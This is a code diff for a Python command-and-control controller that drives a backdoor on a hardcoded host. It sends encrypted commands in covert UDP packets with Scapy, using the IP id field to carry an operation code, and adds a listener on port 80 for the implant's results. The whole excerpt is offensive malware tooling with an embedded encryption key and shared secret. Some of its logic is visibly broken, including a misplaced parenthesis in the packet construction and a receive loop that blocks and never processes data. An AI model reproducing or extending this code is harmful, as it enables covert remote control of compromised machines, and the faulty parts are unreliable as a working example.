@@ -10,12 +10,15 @@ from scapy.all import *
 from scapy.layers.inet import IP, UDP
 
 key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
+code = "secret"
+SIZE = 4379
 
 
 def main():
     # ip = input("Enter backdoor IP: ")
     ip = "192.168.1.26"
     controller = c2(ip)
+    controller.results_receiver()
     if controller.connect():
         while True:
             opt = menu()
@@ -124,13 +127,30 @@ class c2:
     def command_sender(self, opt, data):
         rand_id = int(str(random.randrange(100, 999)) + str(opt))
         port = 5000
-        encrypted_data = self.encrypter.encrypt(data)
-        # s = struct.pack('bb', dchar, dchar1)
-        #dgram = IP(dst=self.kit_ip, id=rand_id / UDP(dport=port) / encrypted_data)
-        #send(dgram, verbose=0)
+        encrypted_data = self.encrypter.encrypt(code + ":" + data)
+        #s = struct.pack('bb', dchar, dchar1)
+        dgram = IP(dst=self.kit_ip, id=rand_id / UDP(dport=port) / encrypted_data)
+        send(dgram, verbose=0)
 
     # http.server module?
     def results_receiver(self):
+        server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
+        server.bind((socket.gethostbyname(socket.gethostname()), 80))
+        while True:
+            data_len = 0
+            data_recv = -1
+            server.listen(1)
+            while True:
+                conn, addr = server.accept()
+                try:
+                    while data_recv != data_len:
+                        data = conn.recv(SIZE)
+                        if data_len == 0:
+                            print("get length")
+                            break
+                finally:
+                    conn.close()
+                    break
         print("receive http")
 
 
